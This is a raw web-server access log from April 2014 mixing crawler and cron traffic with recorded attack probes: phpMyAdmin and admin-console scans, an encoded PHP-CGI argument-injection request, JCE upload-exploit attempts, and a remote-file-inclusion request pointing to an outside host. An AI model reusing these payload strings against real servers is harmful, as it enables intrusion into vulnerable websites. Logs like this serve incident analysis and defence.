210.152.157.25 - - [20/Apr/2014:07:37:41 +0300] "GET / HTTP/1.1" 200 491 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729)"
1.245.107.254 - - [20/Apr/2014:08:14:26 +0300] "GET /manager/html HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
174.139.196.18 - - [20/Apr/2014:13:36:52 +0300] "GET /web-console/ServerInfo.jsp HTTP/1.1" 404 487 "-" "-"
131.253.24.141 - - [20/Apr/2014:15:56:53 +0300] "-" 408 0 "-" "-"
61.161.139.73 - - [20/Apr/2014:22:55:25 +0300] "GET /muieblackcat HTTP/1.1" 404 469 "-" "-"
61.161.139.73 - - [20/Apr/2014:22:55:26 +0300] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 478 "-" "-"
61.161.139.73 - - [20/Apr/2014:22:55:27 +0300] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 478 "-" "-"
61.161.139.73 - - [20/Apr/2014:22:55:28 +0300] "GET //pma/scripts/setup.php HTTP/1.1" 404 473 "-" "-"
61.161.139.73 - - [20/Apr/2014:22:55:29 +0300] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 476 "-" "-"
61.161.139.73 - - [20/Apr/2014:22:55:30 +0300] "GET //MyAdmin/scripts/setup.php HTTP/1.1" 404 477 "-" "-"
183.60.48.25 - - [20/Apr/2014:23:45:02 +0300] "GET http://www.baidu.com/ HTTP/1.1" 200 460 "-" "-"
210.152.157.161 - - [21/Apr/2014:02:28:33 +0300] "GET / HTTP/1.1" 200 491 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729)"
202.149.92.2 - - [21/Apr/2014:04:39:45 +0300] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 512 "-" "-"
67.210.122.93 - - [21/Apr/2014:12:20:20 +0300] "POST /cgi-bin/php/%63%67%69%6E/%70%68%70?%2D%64+%61%6C%75%6F%6E+%2D%64+%6D%6F%64+%2D%64+%73%75%68%6F%6E%3D%6F%6E+%2D%64+%75%6E%63%74%73%3D%22%22+%2D%64+%64%6E%65+%2D%64+%61%75%74%6F%5F%70%72%%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%74%5F%3D%30+%2D%64+%75%74+%2D%6E HTTP/1.1" 404 477 "-" "-"
85.214.90.12 - - [21/Apr/2014:13:35:17 +0300] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 488 "-" "ZmEu"
85.214.90.12 - - [21/Apr/2014:13:35:17 +0300] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 478 "-" "ZmEu"
85.214.90.12 - - [21/Apr/2014:13:35:17 +0300] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 478 "-" "ZmEu"
85.214.90.12 - - [21/Apr/2014:13:35:17 +0300] "GET /pma/scripts/setup.php HTTP/1.1" 404 473 "-" "ZmEu"
85.214.90.12 - - [21/Apr/2014:13:35:17 +0300] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 476 "-" "ZmEu"
85.214.90.12 - - [21/Apr/2014:13:35:17 +0300] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 477 "-" "ZmEu"
183.60.244.44 - - [21/Apr/2014:16:24:08 +0300] "HEAD / HTTP/1.1" 200 281 "-" "python-requests/1.2.3 CPython/2.7.3 Linux/3.5.0-23-generic"
210.152.157.218 - - [22/Apr/2014:08:22:34 +0300] "GET / HTTP/1.1" 200 491 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729)"
183.60.244.29 - - [22/Apr/2014:09:17:56 +0300] "GET / HTTP/1.1" 200 427 "-" "python-requests/1.2.3 CPython/2.7.3 Linux/3.5.0-23-generic"
50.136.4.68 - - [22/Apr/2014:16:00:22 +0300] "-" 408 0 "-" "-"
78.96.130.37 - - [22/Apr/2014:17:44:01 +0300] "-" 408 0 "-" "-"
112.144.199.152 - - [22/Apr/2014:17:59:23 +0300] "-" 408 0 "-" "-"
65.55.212.65 - - [22/Apr/2014:18:34:10 +0300] "-" 408 0 "-" "-"
83.110.109.19 - - [22/Apr/2014:18:47:40 +0300] "-" 408 0 "-" "-"
187.177.36.145 - - [22/Apr/2014:22:41:13 +0300] "GET /manager/html HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
202.53.8.82 - - [22/Apr/2014:23:00:56 +0300] "GET /index.php?page=http://218.206.179.11/TmDe3/pma.php? HTTP/1.1" 404 470 "-" "-"
179.32.177.188 - - [23/Apr/2014:01:50:18 +0300] "-" 408 0 "-" "-"
108.216.201.46 - - [23/Apr/2014:02:45:31 +0300] "-" 408 0 "-" "-"
194.102.231.4 - - [23/Apr/2014:11:50:38 +0300] "POST /wp-cron.php?doing_wp_cron=1398243150.8724279403686523437500 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:11:51:49 +0300] "POST /wp-cron.php?doing_wp_cron=1398243221.9411768913269042968750 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:11:51:49 +0300] "POST /wp-cron.php?doing_wp_cron=1398243221.9530780315399169921875 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:11:52:59 +0300] "POST /wp-cron.php?doing_wp_cron=1398243291.8658399581909179687500 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:11:52:59 +0300] "POST /wp-cron.php?doing_wp_cron=1398243291.8658819198608398437500 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
69.171.230.118 - - [23/Apr/2014:11:54:05 +0300] "GET /images/Fotografii/liceul%20negruzzi.jpg HTTP/1.1" 404 522 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
194.102.231.4 - - [23/Apr/2014:11:54:07 +0300] "POST /wp-cron.php?doing_wp_cron=1398243359.9912168979644775390625 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
69.171.230.118 - - [23/Apr/2014:11:54:07 +0300] "GET /images/Fotografii/liceul%20negruzzi.jpg HTTP/1.1" 404 522 "-" "facebookexternalhit/1.0 (+http://www.facebook.com/externalhit_uatext.php)"
172.28.0.36 - - [23/Apr/2014:11:54:25 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
172.28.0.23 - - [23/Apr/2014:11:55:08 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36"
172.28.0.23 - - [23/Apr/2014:11:55:08 +0300] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36"
66.249.78.72 - - [23/Apr/2014:11:55:11 +0300] "GET /robots.txt HTTP/1.1" 404 503 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.78.72 - - [23/Apr/2014:11:55:24 +0300] "GET /klado/oferte/cee'd%201.6%20CRDi%20(low%20power)%20DYNAMIC.pdf HTTP/1.1" 404 532 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
194.102.231.4 - - [23/Apr/2014:11:55:25 +0300] "POST /wp-cron.php?doing_wp_cron=1398243438.0914580821990966796875 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:11:55:25 +0300] "POST /wp-cron.php?doing_wp_cron=1398243438.0917820930480957031250 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
172.28.0.23 - - [23/Apr/2014:11:55:53 +0300] "GET / HTTP/1.1" 304 210 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36"
194.102.231.4 - - [23/Apr/2014:11:56:33 +0300] "POST /wp-cron.php?doing_wp_cron=1398243506.5374469757080078125000 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
66.249.78.29 - - [23/Apr/2014:11:56:51 +0300] "GET /files4download_ro/Ghid_SCADA.pdf HTTP/1.1" 404 523 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
194.102.231.4 - - [23/Apr/2014:11:57:46 +0300] "POST /wp-cron.php?doing_wp_cron=1398243579.5954530239105224609375 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:11:57:46 +0300] "POST /wp-cron.php?doing_wp_cron=1398243579.5956249237060546875000 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:11:58:53 +0300] "POST /wp-cron.php?doing_wp_cron=1398243646.4480180740356445312500 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:11:58:53 +0300] "POST /wp-cron.php?doing_wp_cron=1398243646.4489998817443847656250 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
83.169.18.24 - - [23/Apr/2014:11:59:22 +0300] "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.1" 404 472 "-" "BOT/0.1 (BOT for JCE)"
83.169.18.24 - - [23/Apr/2014:11:59:27 +0300] "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1" 404 472 "-" "BOT/0.1 (BOT for JCE)"
83.169.18.24 - - [23/Apr/2014:11:59:41 +0300] "GET //images/stories/sekip.gif HTTP/1.1" 404 506 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6"
83.169.18.24 - - [23/Apr/2014:11:59:42 +0300] "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.1" 404 472 "-" "BOT/0.1 (BOT for JCE)"
83.169.18.24 - - [23/Apr/2014:11:59:47 +0300] "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1" 404 472 "-" "BOT/0.1 (BOT for JCE)"
83.169.18.24 - - [23/Apr/2014:12:00:00 +0300] "GET /administratie//images/stories/sekip.gif HTTP/1.1" 404 521 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6"
194.102.231.4 - - [23/Apr/2014:12:00:00 +0300] "POST /wp-cron.php?doing_wp_cron=1398243713.6306149959564208984375 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
66.220.152.113 - - [23/Apr/2014:12:01:01 +0300] "GET /images/medic_1.JPG HTTP/1.1" 404 510 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
194.102.231.4 - - [23/Apr/2014:12:01:03 +0300] "POST /wp-cron.php?doing_wp_cron=1398243776.2426869869232177734375 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:01:03 +0300] "POST /wp-cron.php?doing_wp_cron=1398243776.2426440715789794921875 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
66.220.152.117 - - [23/Apr/2014:12:01:06 +0300] "GET /images/medic_1.JPG HTTP/1.1" 404 510 "-" "facebookexternalhit/1.0 (+http://www.facebook.com/externalhit_uatext.php)"
66.249.78.24 - - [23/Apr/2014:12:01:51 +0300] "GET /2012/12/ HTTP/1.1" 404 502 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
194.102.231.4 - - [23/Apr/2014:12:02:11 +0300] "POST /wp-cron.php?doing_wp_cron=1398243844.4558451175689697265625 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:02:11 +0300] "POST /wp-cron.php?doing_wp_cron=1398243844.4564139842987060546875 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
83.169.18.24 - - [23/Apr/2014:12:02:16 +0300] "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.1" 404 472 "-" "BOT/0.1 (BOT for JCE)"
83.169.18.24 - - [23/Apr/2014:12:02:21 +0300] "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1" 404 472 "-" "BOT/0.1 (BOT for JCE)"
83.169.18.24 - - [23/Apr/2014:12:02:32 +0300] "GET //images/stories/sekip.gif HTTP/1.1" 404 506 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6"
83.169.18.24 - - [23/Apr/2014:12:02:33 +0300] "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.1" 404 472 "-" "BOT/0.1 (BOT for JCE)"
83.169.18.24 - - [23/Apr/2014:12:02:38 +0300] "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1" 404 472 "-" "BOT/0.1 (BOT for JCE)"
83.169.18.24 - - [23/Apr/2014:12:02:49 +0300] "GET /administratie//images/stories/sekip.gif HTTP/1.1" 404 521 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6"
194.102.231.4 - - [23/Apr/2014:12:03:18 +0300] "POST /wp-cron.php?doing_wp_cron=1398243911.0176908969879150390625 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:03:18 +0300] "POST /wp-cron.php?doing_wp_cron=1398243911.0188550949096679687500 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:04:20 +0300] "POST /wp-cron.php?doing_wp_cron=1398243973.1493880748748779296875 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:04:20 +0300] "POST /wp-cron.php?doing_wp_cron=1398243973.1496400833129882812500 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:05:35 +0300] "POST /wp-cron.php?doing_wp_cron=1398244048.3219439983367919921875 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:05:35 +0300] "POST /wp-cron.php?doing_wp_cron=1398244048.3476450443267822265625 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
66.249.78.193 - - [23/Apr/2014:12:05:43 +0300] "GET /index.php/scremerile-comasarii/radio.html HTTP/1.1" 404 523 "-" "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
68.180.224.243 - - [23/Apr/2014:12:06:18 +0300] "GET /robots.txt HTTP/1.1" 404 468 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
68.180.224.243 - - [23/Apr/2014:12:06:19 +0300] "GET / HTTP/1.1" 200 427 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
194.102.231.4 - - [23/Apr/2014:12:06:44 +0300] "POST /wp-cron.php?doing_wp_cron=1398244117.1886389255523681640625 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:06:44 +0300] "POST /wp-cron.php?doing_wp_cron=1398244117.2534101009368896484375 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
172.28.0.23 - - [23/Apr/2014:12:07:48 +0300] "GET / HTTP/1.1" 304 210 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36"
194.102.231.4 - - [23/Apr/2014:12:07:58 +0300] "POST /wp-cron.php?doing_wp_cron=1398244190.7875380516052246093750 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:07:58 +0300] "POST /wp-cron.php?doing_wp_cron=1398244190.7877180576324462890625 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:09:02 +0300] "POST /wp-cron.php?doing_wp_cron=1398244254.9280490875244140625000 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:09:02 +0300] "POST /wp-cron.php?doing_wp_cron=1398244254.9283299446105957031250 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
172.28.0.23 - - [23/Apr/2014:12:09:55 +0300] "GET / HTTP/1.1" 304 210 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36"
194.102.231.4 - - [23/Apr/2014:12:10:16 +0300] "POST /wp-cron.php?doing_wp_cron=1398244332.0818619728088378906250 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:12:19 +0300] "POST /wp-cron.php?doing_wp_cron=1398244455.4200639724731445312500 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:12:20 +0300] "POST /wp-cron.php?doing_wp_cron=1398244455.6573810577392578125000 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
180.76.5.170 - - [23/Apr/2014:12:13:19 +0300] "GET /robots.txt HTTP/1.1" 404 465 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
194.102.231.4 - - [23/Apr/2014:12:13:21 +0300] "POST /wp-cron.php?doing_wp_cron=1398244516.4887299537658691406250 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:13:21 +0300] "POST /wp-cron.php?doing_wp_cron=1398244516.4887568950653076171875 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
172.28.0.23 - - [23/Apr/2014:12:13:38 +0300] "GET / HTTP/1.1" 304 210 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36"
159.149.133.251 - - [23/Apr/2014:12:14:22 +0300] "GET /robots.txt HTTP/1.1" 404 501 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
159.149.133.251 - - [23/Apr/2014:12:14:22 +0300] "GET / HTTP/1.1" 200 483 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
194.102.231.4 - - [23/Apr/2014:12:14:38 +0300] "POST /wp-cron.php?doing_wp_cron=1398244594.3769819736480712890625 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:14:39 +0300] "POST /wp-cron.php?doing_wp_cron=1398244594.4508659839630126953125 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
172.28.0.23 - - [23/Apr/2014:12:15:31 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36"
172.28.0.23 - - [23/Apr/2014:12:15:42 +0300] "GET / HTTP/1.1" 200 483 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36"
194.102.231.4 - - [23/Apr/2014:12:16:02 +0300] "POST /wp-cron.php?doing_wp_cron=1398244678.1485540866851806640625 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:17:25 +0300] "POST /wp-cron.php?doing_wp_cron=1398244760.6125140190124511718750 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:17:25 +0300] "POST /wp-cron.php?doing_wp_cron=1398244760.6276459693908691406250 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:19:00 +0300] "POST /wp-cron.php?doing_wp_cron=1398244855.8626720905303955078125 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:19:00 +0300] "POST /wp-cron.php?doing_wp_cron=1398244856.0073490142822265625000 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:19:00 +0300] "POST /wp-cron.php?doing_wp_cron=1398244856.0172700881958007812500 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:20:03 +0300] "POST /wp-cron.php?doing_wp_cron=1398244918.7197470664978027343750 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
172.28.0.36 - - [23/Apr/2014:12:20:18 +0300] "GET / HTTP/1.1" 304 210 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
172.28.0.36 - - [23/Apr/2014:12:20:20 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
172.28.0.36 - - [23/Apr/2014:12:20:23 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
172.28.0.44 - - [23/Apr/2014:12:20:23 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.44 - - [23/Apr/2014:12:20:23 +0300] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.44 - - [23/Apr/2014:12:20:23 +0300] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.44 - - [23/Apr/2014:12:20:32 +0300] "GET / HTTP/1.1" 304 209 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.44 - - [23/Apr/2014:12:20:33 +0300] "GET / HTTP/1.1" 304 209 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.44 - - [23/Apr/2014:12:20:34 +0300] "GET / HTTP/1.1" 304 209 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.23 - - [23/Apr/2014:12:20:49 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36"
194.102.231.4 - - [23/Apr/2014:12:21:19 +0300] "POST /wp-cron.php?doing_wp_cron=1398244994.7617180347442626953125 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:21:19 +0300] "POST /wp-cron.php?doing_wp_cron=1398244994.7704000473022460937500 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:23:29 +0300] "POST /wp-cron.php?doing_wp_cron=1398245124.5820960998535156250000 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:23:29 +0300] "POST /wp-cron.php?doing_wp_cron=1398245124.5917980670928955078125 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
66.249.78.193 - - [23/Apr/2014:12:23:44 +0300] "GET /index.php/scremerile-comasarii/radio.html HTTP/1.1" 404 523 "-" "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
172.28.0.23 - - [23/Apr/2014:12:23:50 +0300] "GET / HTTP/1.1" 304 210 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36"
194.102.231.4 - - [23/Apr/2014:12:24:37 +0300] "POST /wp-cron.php?doing_wp_cron=1398245192.9848699569702148437500 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:25:37 +0300] "POST /wp-cron.php?doing_wp_cron=1398245253.2203140258789062500000 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
66.249.78.200 - - [23/Apr/2014:12:26:42 +0300] "GET /navigator/scada_shop_repository/Documente_produse/Module%20de%20telemetrie/301.pdf HTTP/1.1" 404 552 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
194.102.231.4 - - [23/Apr/2014:12:26:49 +0300] "POST /wp-cron.php?doing_wp_cron=1398245324.5163440704345703125000 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:26:49 +0300] "POST /wp-cron.php?doing_wp_cron=1398245324.5173790454864501953125 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:27:53 +0300] "POST /wp-cron.php?doing_wp_cron=1398245389.1263940334320068359375 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:27:53 +0300] "POST /wp-cron.php?doing_wp_cron=1398245389.1270670890808105468750 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
172.28.0.23 - - [23/Apr/2014:12:28:30 +0300] "GET / HTTP/1.1" 304 210 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36"
172.28.0.23 - - [23/Apr/2014:12:28:51 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36"
65.19.138.33 - - [23/Apr/2014:12:28:56 +0300] "GET /index.php/eseuri.feed?type=rss HTTP/1.1" 404 470 "-" "Feedly/1.0 (+http://www.feedly.com/fetcher.html; like FeedFetcher-Google)"
194.102.231.4 - - [23/Apr/2014:12:29:08 +0300] "POST /wp-cron.php?doing_wp_cron=1398245464.0375421047210693359375 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:29:08 +0300] "POST /wp-cron.php?doing_wp_cron=1398245464.0385000705718994140625 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
